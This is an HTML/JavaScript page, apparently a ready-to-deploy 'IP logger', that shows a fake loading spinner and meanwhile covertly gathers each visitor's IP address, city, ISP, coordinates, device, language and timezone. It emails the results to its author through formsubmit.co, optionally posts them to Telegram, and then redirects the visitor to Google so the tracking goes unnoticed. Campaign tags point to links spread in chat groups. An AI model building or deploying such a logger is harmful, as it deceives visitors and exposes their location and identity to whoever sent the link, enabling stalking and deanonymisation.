<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#f1f3f4;color:#3c4043;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:20px}
.spin{width:44px;height:44px;border:4px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 18px;animation:sp 1s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
p{font-size:14px;color:#5f6368}
#dbg{display:none;text-align:left;background:#fff;border:1px solid #dadce0;border-radius:10px;padding:14px;font-size:12px;max-width:560px;margin:14px auto;white-space:pre-wrap;direction:ltr;color:#202124}
#credit{display:none;font-size:11px;color:#9aa0a6;margin-top:12px}
</style>

<body>
<div class="box">
<div class="spin"></div>
<p id="msg">Loading, please wait…</p>
<pre id="dbg"></pre>
<p id="credit">Baran IP Log · by Baran Avisat · baranavisat@gmail.com</p>
</div>
<script>
/* Baran IP Log — STATIC v2. Order matters: ipwho.is first (generous free
   tier, IP+geo in one call), geojs.io second, ipapi.co LAST (rate-limits).
   Delivery uses keepalive fetch so data survives the redirect. */
const CONFIG={
  email:'baranavisat@gmail.com',
  redirect:'https://www.google.com',
  minMs:800,        // min spinner time (looks natural)
  maxWaitMs:9000,   // max total wait before forced redirect
  apiMs:6000,       // per-API timeout
  tg:{token:'',chat:''}  // optional Telegram, fill PRIVATELY, never commit
};
const qs=new URLSearchParams(location.search);
const DEBUG=qs.get('debug')==='1';
const TAG=(qs.get('t')||'').slice(0,40);  // campaign tag: ?t=wa-group
function parseUA(ua){
  ua=ua||'';let os='Unknown',br='Unknown';
  const O=[[/iPhone|iPad|iPod/,'iOS'],[/Android/,'Android'],[/Windows NT 10/,'Windows 10/11'],[/Windows NT/,'Windows'],[/Mac OS X/,'Mac OS X'],[/Linux/,'Linux'],[/CrOS/,'ChromeOS']];
  const B=[[/Edg\//,'Edge'],[/OPR\/|Opera/,'Opera'],[/Firefox\//,'Firefox'],[/Chrome\//,'Chrome'],[/Version\/.*Safari/,'Safari'],[/Safari\//,'Safari']];
  for(const [rx,n] of O){if(rx.test(ua)){os=n;break;}}
  for(const [rx,n] of B){if(rx.test(ua)){br=n;break;}}
  const mv=ua.match(/(?:Chrome|Firefox|Version|Edg)\/([\d.]+)/);
  return {os,browser:(br+(mv?' '+mv[1]:'')).trim(),device:/Mobile|Android|iPhone|iPad/.test(ua)?'Mobile':'Desktop'};
}
function raceTimeout(p,ms){
  return Promise.race([p,new Promise(function(res){setTimeout(function(){res(null);},ms);})]);
}
function getJSON(url,ms){
  return raceTimeout(
    fetch(url).then(function(r){if(!r.ok)throw new Error('http '+r.status);return r.json();}).catch(function(){return null;}),
    ms
  );
}
async function collect(){
  const data={time:new Date().toISOString(),tag:TAG,ua:navigator.userAgent||'',
    lang:navigator.language||'',langs:(navigator.languages||[]).join(','),
    tz:(Intl.DateTimeFormat().resolvedOptions()||{}).timeZone||'',
    screen:(screen.width||'?')+'x'+(screen.height||'?'),dpr:window.devicePixelRatio||1,
    referrer:document.referrer||'Direct Link',
    page:location.pathname,ip:'',geo:null};
  data.parsed=parseUA(data.ua);
  // 1) ipwho.is — IP + geo in ONE call (primary)
  try{
    const w=await getJSON('https://ipwho.is/',CONFIG.apiMs);
    if(w&&w.success){
      if(w.ip)data.ip=w.ip;
      data.geo={country:w.country||'',city:w.city||'',
        isp:((w.connection||{}).isp||w.isp||''),
        lat:w.latitude,lon:w.longitude};
    }
  }catch(e){}
  // 2) IP fallbacks (each also carries geo as bonus)
  if(!data.ip){
    try{
      const a=await getJSON('https://api.ipify.org?format=json',5000);
      if(a&&a.ip)data.ip=a.ip;
    }catch(e){}
  }
  if(!data.ip){
    try{
      const g=await getJSON('https://get.geojs.io/v1/ip/geo.json',CONFIG.apiMs);
      if(g&&g.ip){
        data.ip=g.ip;
        if(!data.geo)data.geo={country:g.country||'',city:g.city||'',
          isp:g.organization||'',lat:g.latitude,lon:g.longitude};
      }
    }catch(e){}
  }
  // 3) geo fallbacks (ipapi.co LAST — rate-limits on free tier)
  if(!data.geo&&data.ip){
    try{
      const c=await getJSON('https://ipapi.co/'+encodeURIComponent(data.ip)+'/json/',5000);
      if(c&&!c.error)data.geo={country:c.country_name||'',city:c.city||'',
        isp:c.org||'',lat:c.latitude,lon:c.longitude};
    }catch(e){}
  }
  if(!data.geo){
    try{
      const g2=await getJSON('https://get.geojs.io/v1/ip/geo.json',CONFIG.apiMs);
      if(g2&&(g2.country||g2.city))data.geo={country:g2.country||'',city:g2.city||'',
        isp:g2.organization||'',lat:g2.latitude,lon:g2.longitude};
    }catch(e){}
  }
  return data;
}
function lines(d){
  const g=d.geo||{};
  return ['[+] New Connection (static logger)',
    'Tag: '+(d.tag||'-'),
    'IP: '+(d.ip||'-'),
    'Country: '+(g.country||'-')+' | City: '+(g.city||'-'),
    'ISP: '+(g.isp||'-')+(g.lat!==undefined&&g.lat!==null&&g.lat!==''?' | '+g.lat+','+g.lon:''),
    'OS: '+d.parsed.os+' | Browser: '+d.parsed.browser+' ('+d.parsed.device+')',
    'Lang: '+d.lang+(d.langs&&d.langs!==d.lang?' ['+d.langs+']':'')+' | TZ: '+d.tz,
    'Screen: '+d.screen+' x'+d.dpr,
    'Page: '+d.page,
    'Referer: '+d.referrer,
    'Time: '+d.time].join('\n');
}
async function deliver(d){
  const jobs=[];
  const body=JSON.stringify({name:'Baran IP Log',
    message:lines(d),
    _subject:'🛰️ New connection'+(d.tag?' ['+d.tag+']':'')+': '+(d.ip||'unknown'),
    _template:'table'});
  jobs.push(raceTimeout(
    fetch('https://formsubmit.co/ajax/'+encodeURIComponent(CONFIG.email),{
      method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},
      body:body,keepalive:true}).catch(function(){return null;}),
    7000));
  if(CONFIG.tg.token&&CONFIG.tg.chat){
    jobs.push(raceTimeout(
      fetch('https://api.telegram.org/bot'+CONFIG.tg.token+'/sendMessage',{
        method:'POST',headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:CONFIG.tg.chat,
          text:lines(d).slice(0,3500)}),keepalive:true}).catch(function(){return null;}),
      7000));
  }
  await Promise.all(jobs);
}
(async function(){
  const t0=Date.now();
  const d=await collect();
  if(DEBUG){
    document.getElementById('dbg').style.display='block';
    document.getElementById('dbg').textContent=lines(d)+'\n\n'+JSON.stringify(d,null,1);
    document.getElementById('msg').textContent='DEBUG mode — no redirect.';
    document.getElementById('credit').style.display='block';
    return;
  }
  try{
    await Promise.race([deliver(d),
      new Promise(function(res){setTimeout(res,CONFIG.maxWaitMs);})]);
  }catch(e){}
  const wait=Math.max(0,CONFIG.minMs-(Date.now()-t0));
  setTimeout(function(){location.replace(CONFIG.redirect);},wait);
})();
</script>
